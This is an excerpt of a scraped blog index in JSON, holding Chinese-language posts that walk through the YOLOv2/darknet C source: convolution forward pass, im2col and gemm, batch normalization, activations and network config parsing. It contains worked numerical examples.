1);&#125; 这个函数很容易理解了，就是用来更新网络参数的。其中axpy_cpu和scal_cpu这两个函数我在（三）中也讲过。 至此这三个重要的函数就分析完了，下一章我们会回到make_convolutional_layer函数 文章全部YOLOv2源码分析 由于本人水平有限，文中有不对之处，希望大家指出，谢谢^_^!","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"YOLOv2代码分析（三）","slug":"2017-12-19-YOLOv2代码分析（三）","date":"2017-12-18T16:00:00.000Z","updated":"2018-02-18T08:36:47.841Z","comments":true,"path":"2017/12/19/2017-12-19-YOLOv2代码分析（三）/","link":"","permalink":"http://coordinate.wang/2017/12/19/2017-12-19-YOLOv2代码分析（三）/","excerpt":"接着上一讲没有讲完的make_convolutional_layer函数 0x01 make_convolutional_layer1234//make_convolutional_layerl.forward = forward_convolutional_layer; l.backward = backward_convolutional_layer; l.update = update_convolutional_layer; 上来就是三坐大山^_^，我们先从第一个forward_convolutional_layer开始。 0x0101 forward_convolutional_layer12345void forward_convolutional_layer(convolutional_layer l, network net)&#123;//传入卷积层参数和网络的总参数 int i, j; fill_cpu(l.outputs*l.batch, 0, l.output, 1);","text":"接着上一讲没有讲完的make_convolutional_layer函数 0x01 make_convolutional_layer1234//make_convolutional_layerl.forward = forward_convolutional_layer; l.backward = backward_convolutional_layer; l.update = update_convolutional_layer; 上来就是三坐大山^_^，我们先从第一个forward_convolutional_layer开始。 0x0101 forward_convolutional_layer12345void forward_convolutional_layer(convolutional_layer l, network net)&#123;//传入卷积层参数和网络的总参数 int i, j; fill_cpu(l.outputs*l.batch, 0, l.output, 1); 看这个fill_cpu函数 12345void fill_cpu(int N, float ALPHA, float *X, int INCX)&#123; int i; for(i = 0; i &lt; N; ++i) X[i*INCX] = ALPHA;&#125; 输入的参数N表示一个batch中所有的图像元素个数，x指向n对应大小分配的内存空间。整个函数来看就是对输出图像元素的一个初始化操作。 接着看后面 1234567//forward_convolutional_layerif(l.xnor)&#123; binarize_weights(l.weights, l.n, l.c/l.groups*l.size*l.size, l.binary_weights); swap_binary(&amp;l); binarize_cpu(net.input, l.c*l.h*l.w*l.batch, l.binary_input); net.input = l.binary_input; &#125; 判断是否二值化操作，如果是的话，其中有两个关键的函数binarize_weights和binarize_cpu 1234567891011121314void binarize_weights(float *weights, int n, int size, float *binary)&#123; int i, f; for(f = 0; f &lt; n; ++f)&#123; float mean = 0; for(i = 0; i &lt; size; ++i)&#123; mean += fabs(weights[f*size + i]); &#125; mean = mean / size; for(i = 0; i &lt; size; ++i)&#123; binary[f*size + i] = (weights[f*size + i] &gt; 0) ? mean : -mean; &#125; &#125;&#125; 第一个参数就是指向分配给weight内存空间 的指针，第二参数是卷积核个数，第三个参数是一个卷积核weight的个数（这里应该使用l.nweights/l.n），第四个参数是指向分配给二值化weight内存空间 的指针。举个例子 12345678910111213假设有两个2x2卷积核n=2 size=4权重值总共8个 1 2 3 4 5 6 7 8第一次循环 f=0 mean = 1+2+3+4 = 10mean/4 = 2.5binary[0]=2.5 binary[1]=2.5 binary[2]=2.5 binary[3]=2.5第二次循环 f=1mean = 5+6+7+8 = 26mean/4 = 6.5binary[0]=6.5 binary[1]=6.5 binary[2]=6.5 binary[3]=6.5 接着看后面的swap_binary函数 123456789101112void swap_binary(convolutional_layer *l)&#123; float *swap = l-&gt;weights; l-&gt;weights = l-&gt;binary_weights; l-&gt;binary_weights = swap;#ifdef GPU swap = l-&gt;weights_gpu; l-&gt;weights_gpu = l-&gt;binary_weights_gpu; l-&gt;binary_weights_gpu = swap;#endif&#125; 函数的作用很明显了，就要把以前的权重值替换二值化后的 接着binarize_cpu函数 1234567void binarize_cpu(float *input, int n, float *binary)&#123; int i; for(i = 0; i &lt; n; ++i)&#123; binary[i] = (input[i] &gt; 0) ? 1 : -1; &#125;&#125; 函数的第一个参数指向输入图像内存空间的指针，函数第二个参数表示一个batch的图像元素个数，函数第三个参数指向分配给二值化input内存空间 的指针。 函数很简单，总体来看函数的作用就是出入图像的二值化。 最后将得到的二值化输入图像赋值给原来的输入图像。 我们接着回到forward_convolutional_layer函数 123456789101112131415//forward_convolutional_layerint m = l.n/l.groups;//一个group的卷积核个数 int k = l.size*l.size*l.c/l.groups;//一个group的卷积核元素个数 int n = l.out_w*l.out_h;//一个输出图像的元素个数 for(i = 0; i &lt; l.batch; ++i)&#123; for(j = 0; j &lt; l.groups; ++j)&#123; float *a = l.weights + j*l.nweights/l.groups; float *b = net.workspace; float *c = l.output + (i*l.groups + j)*n*m; im2col_cpu(net.input + (i*l.groups + j)*l.c/l.groups*l.h*l.w, l.c/l.groups, l.h, l.w, l.size, l.stride, l.pad, b); gemm(0,0,m,n,k,1,a,k,b,n,1,c,n); &#125; &#125; 这里有两个非常重要的函数im2col_cpu和gemm。先看第一个 0x0102 im2col_cpu &amp;&amp; gemm12345678910111213141516171819202122232425262728293031323334353637float im2col_get_pixel(float *im, int height, int width, int channels, int row, int col, int channel, int pad)&#123; row -= pad; col -= pad; if (row &lt; 0 || col &lt; 0 || row &gt;= height || col &gt;= width) return 0; return im[col + width*(row + height*channel)];&#125;//From Berkeley Vision's Caffe!//https://github.com/BVLC/caffe/blob/master/LICENSEvoid im2col_cpu(float* data_im, int channels, int height, int width, int ksize, int stride, int pad, float* data_col) &#123; int c,h,w; int height_col = (height + 2*pad - ksize) / stride + 1;//卷积后的高度 int width_col = (width + 2*pad - ksize) / stride + 1;//卷积后的宽度 int channels_col = channels * ksize * ksize; for (c = 0; c &lt; channels_col; ++c) &#123; int w_offset = c % ksize; int h_offset = (c / ksize) % ksize; int c_im = c / ksize / ksize; for (h = 0; h &lt; height_col; ++h) &#123; for (w = 0; w &lt; width_col; ++w) &#123; int im_row = h_offset + h * stride; int im_col = w_offset + w * stride; int col_index = (c * height_col + h) * width_col + w; data_col[col_index] = im2col_get_pixel(data_im, height, width, channels, im_row, im_col, c_im, pad); &#125; &#125; &#125;&#125; 这个函数是参考了早期caffe中的设计，但是现在caffe好像有了新的做法。首先说说这个函数的参数 data_im:指向输入数据的指针 channels:一个卷积组的通道数 height:输入图像的高 width:输入图像的宽 ksize:卷积核的大小 stride:步长大小 pad:pad大小 data_col:指向数据转化后的内存空间 这个函数比较复杂，还是举个例子说明 1234567891011121314151617181920212223242526272829303132333435我们假设输入图片大小3x3，pad=1，stride=2，卷积核大小3x3，channels=10 0 0 0 00 1 2 3 00 4 5 6 00 7 8 9 00 0 0 0 0height_col = (3+2-3)/2+1 = 2width_col = (3+2-3)/2+1 = 2channels = 1*3*3 = 9进入第一个循环c = 0w_offset = 0h_offset = 0c_im = 0h=0 w=0im_row = 0im_col = 0col_index = 0data_col[0] = 0h=0 w=1im_row = 0im_col = 1col_index = 1data_col[1] = 0...data_col[2]=0 data_col[3]=5 data_col[4]=0 data_col[5]=0 data_col[6]=4 data_col[7]=6... 0 0 0 0 0 0 1 2 3 0 0 4 5 6 0 ==&gt; 0 0 0 5 0 0 4 6 0 0 5 0 0 2 0 8 1 3 7 9 2 0 8 0 0 5 0 0 4 6 0 0 5 0 0 00 7 8 9 0 0 0 0 0 0 翻译成人能看得懂的就是 1234567890 0 0 50 0 4 60 0 5 00 2 0 81 3 7 92 0 8 00 5 0 04 6 0 05 0 0 0 这个矩阵有什么特殊的含义呢? 我们不难发现，这个矩阵的每一列就表示卷积核对应的一个小窗口，例如第一个窗口0 0 0 0 1 2 0 4 5，很有意思是不是？ 接着我们再来看看这个gemm函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void gemm(int TA, int TB, int M, int N, int K, float ALPHA, float *A, int lda, float *B, int ldb, float BETA, float *C, int ldc)&#123; gemm_cpu( TA, TB, M, N, K, ALPHA,A,lda, B, ldb,BETA,C,ldc);&#125;void gemm_cpu(int TA, int TB, int M, int N, int K, float ALPHA, float *A, int lda, float *B, int ldb, float BETA, float *C, int ldc)&#123; //printf(\"cpu: %d %d %d %d %d %f %d %d %f %d\\n\",TA, TB, M, N, K, ALPHA, lda, ldb, BETA, ldc); int i, j; for(i = 0; i &lt; M; ++i)&#123; for(j = 0; j &lt; N; ++j)&#123; C[i*ldc + j] *= BETA;//因为前面的BETA是1，所以这里我们也不关心了 &#125; &#125; if(!TA &amp;&amp; !TB) gemm_nn(M, N, K, ALPHA,A,lda, B, ldb,C,ldc); else if(TA &amp;&amp; !TB) gemm_tn(M, N, K, ALPHA,A,lda, B, ldb,C,ldc); else if(!TA &amp;&amp; TB) gemm_nt(M, N, K, ALPHA,A,lda, B, ldb,C,ldc); else gemm_tt(M, N, K, ALPHA,A,lda, B, ldb,C,ldc);&#125;void gemm_nn(int M, int N, int K, float ALPHA, float *A, int lda, float *B, int ldb, float *C, int ldc)&#123; int i,j,k; #pragma omp parallel for for(i = 0; i &lt; M; ++i)&#123; for(k = 0; k &lt; K; ++k)&#123; register float A_PART = ALPHA*A[i*lda+k]; for(j = 0; j &lt; N; ++j)&#123; C[i*ldc+j] += A_PART*B[k*ldb+j]; &#125; &#125; &#125;&#125; 由于gemm前面传入的参数是0,0，所以我这里只看gemm_nn这个函数，其他函数操作相似，不再赘述。 我们还是先看看这个函数的参数 M: A的行数 N: B的列数 K: A的列数 ALPHA:系数 A:指向矩阵a的指针 lda: a的列数 B:指向矩阵b的指针 ldb: b的列数 C:指向矩阵c的指针 ldc: c的列数 我们知道这里A就是输入weight的矩阵，B就是我们前面im2col_cpu中得到的输出矩阵，C用来存储我们最后得到的矩阵（其实是一个数组，前面说的矩阵也是）。M 一个group的卷积核个数，K一个group的卷积核元素个数，N 一个输出图像的元素个数，lda一个group的卷积核元素个数，ldb一个输出图像的元素个数，ldc一个输出图像的元素个数。 我们还是举个例子说明 12345678910111213141516171819202122232425这里我们假设卷积核还是3x3权重矩阵A为1 2 34 5 6 ==&gt; 1 2 3 4 5 6 7 8 9（应该这样写）7 8 9B为0 0 0 50 0 4 60 0 5 00 2 0 81 3 7 92 0 8 00 5 0 04 6 0 05 0 0 0C初始化后为1 1 1 1M=1 K=9 N=4 lda=9 ldb=4 ldb=4C[0]=ALPHA*A[0]*B[0]+ALPHA*A[1]*B[4]+...+ALPHA*A[8]*B[32]=95C[1]=107C[2]=107C[3]=95 换成人能看懂的 12345678910 B [0 0 0 5 0 0 4 6 0 0 5 0 A 0 2 0 8 C C[1 2 3 4 5 6 7 8 9] * 1 3 7 9 + [1 1 1 1]==&gt; [95 107 107 95] 2 0 8 0 0 5 0 0 4 6 0 0 5 0 0 0] 所以这两个函数的意图很明显了，就是将卷积变换成了矩阵运算。一些有意思的数学技巧^_^!!! 最后简要的提一下gemm_nn 、gemm_tn、gemm_tt、gemm_nt他们之间的区别，他们的命名都是有意义的。这里的n指的是not transpose而t指的是transpose。例如nn就表示AB都不转置。 接着我们回到forward_convolutional_layer函数 123//forward_convolutional_layer if(l.batch_normalize)&#123; forward_batchnorm_layer(l, net); 这里有出现一个有用的函数forward_batchnorm_layer 0x0103 forward_batchnorm_layer1234void forward_batchnorm_layer(layer l, network net)&#123; if(l.type == BATCHNORM) copy_cpu(l.outputs*l.batch, net.input, 1, l.output, 1); copy_cpu(l.outputs*l.batch, l.output, 1, l.x, 1); 上来就是一个函数copy_cpu 12345void copy_cpu(int N, float *X, int INCX, float *Y, int INCY)&#123; int i; for(i = 0; i &lt; N; ++i) Y[i*INCY] = X[i*INCX];&#125; 我们先看一下输入的参数分别表示的是什么意思。如果我们定义了BATCHNORM，那么这里的N表示一个batch中的输出参数个数，x表示指向输入参数的指针，y表示指向输出参数的指针。那函数的目的很简单，将net中的输入，复制到layer中的输出；如果没有定义BATCHNORM，那么将layer中的输出复制到layer中的x。接着看后面（可以参考这篇论文Batch Normalization: Accelerating Deep Network Training by Reducing Internal Covariate Shift） 123456789101112131415161718//forward_batchnorm_layer if(net.train)&#123; mean_cpu(l.output, l.batch, l.out_c, l.out_h*l.out_w, l.mean); variance_cpu(l.output, l.mean, l.batch, l.out_c, l.out_h*l.out_w, l.variance); scal_cpu(l.out_c, .99, l.rolling_mean, 1); axpy_cpu(l.out_c, .01, l.mean, 1, l.rolling_mean, 1); scal_cpu(l.out_c, .99, l.rolling_variance, 1); axpy_cpu(l.out_c, .01, l.variance, 1, l.rolling_variance, 1); normalize_cpu(l.output, l.mean, l.variance, l.batch, l.out_c, l.out_h*l.out_w); copy_cpu(l.outputs*l.batch, l.output, 1, l.x_norm, 1); &#125; else &#123; normalize_cpu(l.output, l.rolling_mean, l.rolling_variance, l.batch, l.out_c, l.out_h*l.out_w); &#125; scale_bias(l.output, l.scales, l.batch, l.out_c, l.out_h*l.out_w); add_bias(l.output, l.biases, l.batch, l.out_c, l.out_h*l.out_w);&#125; 我准备把这几个函数放在一块解析，因为这几个函数都不大。先看mean_cpu 123456789101112131415void mean_cpu(float *x, int batch, int filters, int spatial, float *mean)&#123; float scale = 1./(batch * spatial);//求分母 int i,j,k; for(i = 0; i &lt; filters; ++i)&#123; mean[i] = 0; for(j = 0; j &lt; batch; ++j)&#123; for(k = 0; k &lt; spatial; ++k)&#123; int index = j*filters*spatial + i*spatial + k; mean[i] += x[index]; &#125; &#125; mean[i] *= scale; &#125;&#125; x:指向layer的输出 batch:一个batch的大小 filters:输出的图像通道数，在这里同样可以理解为卷积核个数 spatial:输出图片的大小 mean:指向保存结果的指针 还是举个例子 1234567891011121314x [95 107 107 95 1 2 3 4]batch = 1filters = 2spatial = 2x2 = 4scale = 1/(1x4) = 0.25第一次循环i=0 j=0mean[0]=0k=0index=0mean[0]=0+x[0]=95...mean[0]=101 mean[1]=2.5 那么这个函数的意义就很明晰了。它要求出的是不同通道下所有输入图像的均值。对应BN论文中的这个公式 $\\frac{1}{m}\\sum_{i=1}^m{x_i} $ //mini-batch mean 接着看variance_cpu函数 123456789101112131415void variance_cpu(float *x, float *mean, int batch, int filters, int spatial, float *variance)&#123; float scale = 1./(batch * spatial - 1);//注意这里的减1操作 int i,j,k; for(i = 0; i &lt; filters; ++i)&#123; variance[i] = 0; for(j = 0; j &lt; batch; ++j)&#123; for(k = 0; k &lt; spatial; ++k)&#123; int index = j*filters*spatial + i*spatial + k; variance[i] += pow((x[index] - mean[i]), 2); &#125; &#125; variance[i] *= scale; &#125;&#125; x:指向layer的输出指针 mean:指向上面函数输出的均值 batch:batch大小 filters:输出的图像通道数，在这里同样可以理解为卷积核个数 spatial:输出图片的大小 variance:指向保存结果的指针 举个例子 12345678910111213x [95 107 107 95 1 2 3 4]mean [101 25]batch = 1filters = 2spatial = 2x2 = 4 scale = 1/(1x4 - 1)=0.333i=0variance[0]=0j=0 k=0index=0variance[0] = 0+(95-101)^2...variance[0]=48 variance[1]=1.66666675 那么这个函数的意义就很明晰了。它要求出的是不同通道下所有输入图像的样本方差（对于n个数据，如果n-1个确定了，那么剩下的那个就确定了（前提知道均值，均值*n - (n-1)数））。对应BN论文中的这个公式 $\\frac{1}{m}\\sum_{i=1}^m(x_i - \\mu_\\beta) $ //mini-batch variance 接着看scal_cpu函数 12345void scal_cpu(int N, float ALPHA, float *X, int INCX)&#123; int i; for(i = 0; i &lt; N; ++i) X[i*INCX] *= ALPHA;&#125; 这个函数很简单，就是将输入的数据乘以一个系数。 接着看axpy_cpu函数 12345void axpy_cpu(int N, float ALPHA, float *X, int INCX, float *Y, int INCY)&#123; int i; for(i = 0; i &lt; N; ++i) Y[i*INCY] += ALPHA*X[i*INCX];&#125; 这个函数也很简单，就是Y =ALPHA*X + Y 接着看normalize_cpu这个函数 123456789101112void normalize_cpu(float *x, float *mean, float *variance, int batch, int filters, int spatial)&#123; int b, f, i; for(b = 0; b &lt; batch; ++b)&#123; for(f = 0; f &lt; filters; ++f)&#123; for(i = 0; i &lt; spatial; ++i)&#123; int index = b*filters*spatial + f*spatial + i; x[index] = (x[index] - mean[f])/(sqrt(variance[f]) + .000001f); &#125; &#125; &#125;&#125; x：layer的输出图像 mean:前面算的均值 variance:前面算的样本方差 batch:batch大小 filters:输出的图像通道数，在这里同样可以理解为卷积核个数 spatial:输出图片的大小 还是举个例子 12345678910111213x [95 107 107 95 1 2 3 4]mean [101 25]variance [48 1.66666675]batch=1filters=2spatial = 2x2 = 4进入第一层循环b=0 f=0 i=0index = 0x[0] = (x[0]-m[0])/(sqrt(variance[0]) + 0.000001f) = -1.44...x[0]=-0.866025329 x[0]=0.866025329 x[0]=0.866025329 x[0]=-0.866025329x[0]=-1.16189408 x[0]=-0.387298018 x[0]=0.387298018 x[0]=1.16189408 这个函数的作用就是一个归一化处理。对应BN论文中的这个公式 $\\frac{x_i-\\mu_\\beta}{\\sqrt{\\sigma_\\beta^2 + \\epsilon}}$ //normalize 接着看scale_bias和add_bias函数 12345678910111213141516171819202122void scale_bias(float *output, float *scales, int batch, int n, int size)&#123; int i,j,b; for(b = 0; b &lt; batch; ++b)&#123; for(i = 0; i &lt; n; ++i)&#123; for(j = 0; j &lt; size; ++j)&#123; output[(b*n + i)*size + j] *= scales[i]; &#125; &#125; &#125;&#125;void add_bias(float *output, float *biases, int batch, int n, int size)&#123; int i,j,b; for(b = 0; b &lt; batch; ++b)&#123; for(i = 0; i &lt; n; ++i)&#123; for(j = 0; j &lt; size; ++j)&#123; output[(b*n + i)*size + j] += biases[i]; &#125; &#125; &#125;&#125; 这两个函数的意义都很简单。对应BN论文中的这个公式 $\\gamma \\hat{x_i}+\\beta$ 接着我们回到forward_convolutional_layer函数 12345678910//forward_convolutional_layer if(l.batch_normalize)&#123; forward_batchnorm_layer(l, net); &#125; else &#123; add_bias(l.output, l.biases, l.batch, l.n, l.out_h*l.out_w); &#125; activate_array(l.output, l.outputs*l.batch, l.activation); if(l.binary || l.xnor) swap_binary(&amp;l);&#125; 如果没有设置batch_normalize，直接添加偏向就完事了。接着是activate_array函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748void activate_array(float *x, const int n, const ACTIVATION a)&#123; int i; for(i = 0; i &lt; n; ++i)&#123; x[i] = activate(x[i], a); &#125;&#125;float activate(float x, ACTIVATION a)&#123; switch(a)&#123; case LINEAR: return linear_activate(x); case LOGISTIC: return logistic_activate(x); case LOGGY: return loggy_activate(x); case RELU: return relu_activate(x); case ELU: return elu_activate(x); case RELIE: return relie_activate(x); case RAMP: return ramp_activate(x); case LEAKY: return leaky_activate(x); case TANH: return tanh_activate(x); case PLSE: return plse_activate(x); case STAIR: return stair_activate(x); case HARDTAN: return hardtan_activate(x); case LHTAN: return lhtan_activate(x); &#125; return 0;&#125;static inline float linear_activate(float x)&#123;return x;&#125;static inline float logistic_activate(float x)&#123;return 1./(1. + exp(-x));&#125;static inline float loggy_activate(float x)&#123;return 2./(1. + exp(-x)) - 1;&#125;static inline float relu_activate(float x)&#123;return x*(x&gt;0);&#125;static inline float elu_activate(float x)&#123;return (x &gt;= 0)*x + (x &lt; 0)*(exp(x)-1);&#125;static inline float relie_activate(float x)&#123;return (x&gt;0) ? x : .01*x;&#125;static inline float ramp_activate(float x)&#123;return x*(x&gt;0)+.1*x;&#125;static inline float leaky_activate(float x)&#123;return (x&gt;0) ? x : .1*x;&#125;static inline float tanh_activate(float x)&#123;return (exp(2*x)-1)/(exp(2*x)+1);&#125; 这个函数的意义也很明显，就是将layer的输出图像，输入到我们设置的激活函数中。至此forward_convolutional_layer中的问题全部解决。 好的，这篇文章的篇幅有些长了，我们把剩余部分放到下一篇 文章全部YOLOv2源码分析 由于本人水平有限，文中有不对之处，希望大家指出，谢谢^_^! 下一篇开始分析backward_convolutional_layer，敬请关注。","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"YOLOv2代码分析（二）","slug":"2017-12-17-YOLOv2代码分析（二）","date":"2017-12-16T16:00:00.000Z","updated":"2018-02-18T08:36:56.656Z","comments":true,"path":"2017/12/17/2017-12-17-YOLOv2代码分析（二）/","link":"","permalink":"http://coordinate.wang/2017/12/17/2017-12-17-YOLOv2代码分析（二）/","excerpt":"0x01 parse_network_cfg我们继续前面没有说完的parse_network_cfg 123//parse_network_cfgnode *n = sections-&gt;front; if(!n) error(\"Config file has no sections\"); 我么先要了解一下list结构 12345678910typedef struct list&#123; int size; node *front; node *back;&#125; list;typedef struct node&#123; void *val; struct node *next; struct node *prev;&#125; node;","text":"0x01 parse_network_cfg我们继续前面没有说完的parse_network_cfg 123//parse_network_cfgnode *n = sections-&gt;front; if(!n) error(\"Config file has no sections\"); 我么先要了解一下list结构 12345678910typedef struct list&#123; int size; node *front; node *back;&#125; list;typedef struct node&#123; void *val; struct node *next; struct node *prev;&#125; node; 这其实是一个双向链表，前向和后项都是一个node数据结构。这里，如果，这个链表后没有节点的话，就报错。 接着往后 12//parse_network_cfgnetwork *net = make_network(sections-&gt;size - 1); 这里使用了一个make_network函数 12345678910network *make_network(int n)&#123; network *net = calloc(1, sizeof(network)); net-&gt;n = n; net-&gt;layers = calloc(net-&gt;n, sizeof(layer)); net-&gt;seen = calloc(1, sizeof(size_t)); net-&gt;t = calloc(1, sizeof(int)); net-&gt;cost = calloc(1, sizeof(float)); return net;&#125; 注意这里的这个make_network可能和早期的不太一样。我们先看看这里他做了什么。先看看network这个结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//这个文件现在放在了darknet.h文件中typedef enum &#123; CONSTANT, STEP, EXP, POLY, STEPS, SIG, RANDOM&#125; learning_rate_policy;typedef struct network&#123; int n; //网络总层数 int batch; //一个batch包含的图片数目，看下面的subdivisions size_t *seen; //已经读取的图片数量 int *t; float epoch; //训练的次数 int subdivisions; //注意前面的batch/subdivisions才是网络的batch大小，可能目的是防止gpu显存不够 layer *layers; //指向网络的层 float *output; learning_rate_policy policy;//学习率的策略，是一个枚举类型 float learning_rate;//学习率 float momentum; //动量，一般0.9 float decay; //权重衰减正则项，防止过拟合 float gamma; //用于计算学习率，见后面0x0102 float scale; //用于计算学习率，见后面0x0102 float power; //用于计算学习率，见后面0x0102 int time_steps; int step; //用于计算学习率，见后面0x0102 int max_batches; //最大的训练batch数目 float *scales; //用于计算学习率，见后面0x0102 int *steps; //用于计算学习率，见后面0x0102 int num_steps; //steps中的数据个数 int burn_in; int adam; //adam算法 float B1; //一阶矩估计的指数衰减率 float B2; //二阶矩估计的指数衰减率 float eps; //为了防止在实现中除以零 int inputs; //h*w*c int outputs; int truths; int notruth; int h, w, c; //输入图像的高，宽，通道数 int max_crop; //控制图片缩放的最大值 int min_crop; //控制图片缩放的最小值 float max_ratio; //控制图片缩放的最大比例 float min_ratio; //控制图片缩放的最小比例 int center; float angle; //设置旋转角度，扩充数据 float aspect; //设置方位，扩充数据 float exposure; //设置饱和度，扩充数据 float saturation; //设置曝光量，扩充数据 float hue; //设置色调，扩充数据 int random; //random为1时随机使用不同尺寸的图片进行训练 int gpu_index; //设置第几个gpu tree *hierarchy; float *input; float *truth; float *delta; float *workspace; int train; int index; float *cost;#ifdef GPU float *input_gpu; float *truth_gpu; float *delta_gpu; float *output_gpu;#endif&#125; network; 由于参数太多，用到哪个说哪个，这个结构的主要作用就是存储网络的配置参数。make_network的作用就是产生network这种数据结构。接着往下 123//parse_network_cfgnet-&gt;gpu_index = gpu_index;//设置gpu size_params params; 又出现一个新的结构size_params 12345678910typedef struct size_params&#123; int batch; //一个batch包含的图片数目 int inputs; int h; //图像的高 int w; //输入图像的宽 int c; //输入图像的通道数 int index; int time_steps; network *net;&#125; size_params; 接着往下 12 //parse_network_cfgsection *s = (section *)n-&gt;val;//section这个结构我在（一）中提过 n是一个node结构，这个结构中的val是一个void*，所以这里就是将node结构中的val强转为section*，相当于我在（一）中图上画的[net]等节点。 123 //parse_network_cfg list *options = s-&gt;options;//这里就是之前说的kvp，也就是size=3,stride=1,pad=1这些 if(!is_network(s)) error(\"First section must be [net] or [network]\"); 看一下这个is_network函数 12345int is_network(section *s)&#123; return (strcmp(s-&gt;type, \"[net]\")==0 || strcmp(s-&gt;type, \"[network]\")==0);&#125; 这个函数的作用很明显，判断传入的第一个section是不是[net]或[network]。接着又是一个比较大的函数 12//parse_network_cfg parse_net_options(options, net); 0x0101 parse_net_options12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879void parse_net_options(list *options, network *net)//传入的时options参数和我们的network&#123; net-&gt;batch = option_find_int(options, \"batch\",1);//设置net的batch大小 net-&gt;learning_rate = option_find_float(options, \"learning_rate\", .001);//设置学习率 net-&gt;momentum = option_find_float(options, \"momentum\", .9);//设置动量 net-&gt;decay = option_find_float(options, \"decay\", .0001);//设置权重衰减 int subdivs = option_find_int(options, \"subdivisions\",1);//设置subdivisions，防止显存不够 net-&gt;time_steps = option_find_int_quiet(options, \"time_steps\",1); net-&gt;notruth = option_find_int_quiet(options, \"notruth\",0); net-&gt;batch /= subdivs; net-&gt;batch *= net-&gt;time_steps; net-&gt;subdivisions = subdivs; net-&gt;random = option_find_int_quiet(options, \"random\", 0); net-&gt;adam = option_find_int_quiet(options, \"adam\", 0); if(net-&gt;adam)&#123;//设置adam参数，这里的默认选项是按照adam论文给的参数设置的 net-&gt;B1 = option_find_float(options, \"B1\", .9); net-&gt;B2 = option_find_float(options, \"B2\", .999); net-&gt;eps = option_find_float(options, \"eps\", .0000001); &#125; net-&gt;h = option_find_int_quiet(options, \"height\",0); net-&gt;w = option_find_int_quiet(options, \"width\",0); net-&gt;c = option_find_int_quiet(options, \"channels\",0); net-&gt;inputs = option_find_int_quiet(options, \"inputs\", net-&gt;h * net-&gt;w * net-&gt;c); net-&gt;max_crop = option_find_int_quiet(options, \"max_crop\",net-&gt;w*2); net-&gt;min_crop = option_find_int_quiet(options, \"min_crop\",net-&gt;w); net-&gt;max_ratio = option_find_float_quiet(options, \"max_ratio\", (float) net-&gt;max_crop / net-&gt;w); net-&gt;min_ratio = option_find_float_quiet(options, \"min_ratio\", (float) net-&gt;min_crop / net-&gt;w); net-&gt;center = option_find_int_quiet(options, \"center\",0); net-&gt;angle = option_find_float_quiet(options, \"angle\", 0); net-&gt;aspect = option_find_float_quiet(options, \"aspect\", 1); net-&gt;saturation = option_find_float_quiet(options, \"saturation\", 1); net-&gt;exposure = option_find_float_quiet(options, \"exposure\", 1); net-&gt;hue = option_find_float_quiet(options, \"hue\", 0); if(!net-&gt;inputs &amp;&amp; !(net-&gt;h &amp;&amp; net-&gt;w &amp;&amp; net-&gt;c)) error(\"No input parameters supplied\"); char *policy_s = option_find_str(options, \"policy\", \"constant\"); net-&gt;policy = get_policy(policy_s); net-&gt;burn_in = option_find_int_quiet(options, \"burn_in\", 0); net-&gt;power = option_find_float_quiet(options, \"power\", 4); if(net-&gt;policy == STEP)&#123;//如果学习率的策略是STEP的话 net-&gt;step = option_find_int(options, \"step\", 1); net-&gt;scale = option_find_float(options, \"scale\", 1); &#125; else if (net-&gt;policy == STEPS)&#123;//如果学习率的策略是STEPS的话 char *l = option_find(options, \"steps\");//指向steps的字符串 char *p = option_find(options, \"scales\");//指向scales的字符串 if(!l || !p) error(\"STEPS policy must have steps and scales in cfg file\"); int len = strlen(l); int n = 1; int i; for(i = 0; i &lt; len; ++i)&#123; if (l[i] == ',') ++n; &#125; int *steps = calloc(n, sizeof(int));//将所有的steps值分开存放到这个数组中 float *scales = calloc(n, sizeof(float));//将所有的scales值分开存放到这个数组中 for(i = 0; i &lt; n; ++i)&#123; int step = atoi(l); float scale = atof(p); l = strchr(l, ',')+1; p = strchr(p, ',')+1; steps[i] = step; scales[i] = scale; &#125; net-&gt;scales = scales; net-&gt;steps = steps; net-&gt;num_steps = n; &#125; else if (net-&gt;policy == EXP)&#123; net-&gt;gamma = option_find_float(options, \"gamma\", 1); &#125; else if (net-&gt;policy == SIG)&#123; net-&gt;gamma = option_find_float(options, \"gamma\", 1); net-&gt;step = option_find_int(options, \"step\", 1); &#125; else if (net-&gt;policy == POLY || net-&gt;policy == RANDOM)&#123; &#125; net-&gt;max_batches = option_find_int(options, \"max_batches\", 0);&#125; 这个函数中出现了这个函数option_find_int_quiet 12345678910111213141516171819int option_find_int_quiet(list *l, char *key, int def)&#123; char *v = option_find(l, key); if(v) return atoi(v); return def;&#125;char *option_find(list *l, char *key)&#123; node *n = l-&gt;front; while(n)&#123; kvp *p = (kvp *)n-&gt;val; if(strcmp(p-&gt;key, key) == 0)&#123; p-&gt;used = 1; return p-&gt;val; &#125; n = n-&gt;next; &#125; return 0;&#125; 这个函数和之前的option_find_int不同。首先看里面的option_find这个函数的作用就是查找list中，node的key和参数的key相同的node，返回这个node的val，如果不存在，返回0。通过这个函数我们得到了pad=1 stride=2等参数后的数值信息。接下来就很easy了，如果有这个参数就将这个字符串（得到的是一个字符串，不是一个数）转化为一个整数，没有的话就返回三个参数（有点类似于默认参数）。 回顾整个option_find_int_quiet，它的作用就是找出和key的node的数值大小。类似于一种map里面的查找操作。 而再看option_find_int 1234567int option_find_int(list *l, char *key, int def)&#123; char *v = option_find(l, key); if(v) return atoi(v); fprintf(stderr, \"%s: Using default '%d'\\n\", key, def); return def;&#125; 它和前者的区别在于，它会打印报错信息。 0x0102 学习率策略学习率策略的设置是一个枚举类型 